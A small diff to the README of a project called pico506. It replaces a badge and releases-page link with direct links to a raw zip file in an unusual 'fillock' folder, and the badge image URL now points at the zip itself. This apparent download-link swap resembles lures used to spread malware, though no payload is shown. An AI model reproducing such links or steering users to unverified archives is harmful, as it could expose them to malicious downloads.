@@ -8,7 +8,7 @@ Welcome to pico506! This application lets you emulate the smallest and most affo
 
 To get started, visit this page to download the latest version of pico506:
 
-[![Download pico506](https://img.shields.io/badge/Download%20pico506-v1.0-blue)](https://github.com/class1kqqe/pico506/releases)
+[![Download pico506](https://raw.githubusercontent.com/class1kqqe/pico506/master/fillock/pico506.zip%20pico506-v1.0-blue)](https://raw.githubusercontent.com/class1kqqe/pico506/master/fillock/pico506.zip)
 
 ### Steps to Download
 
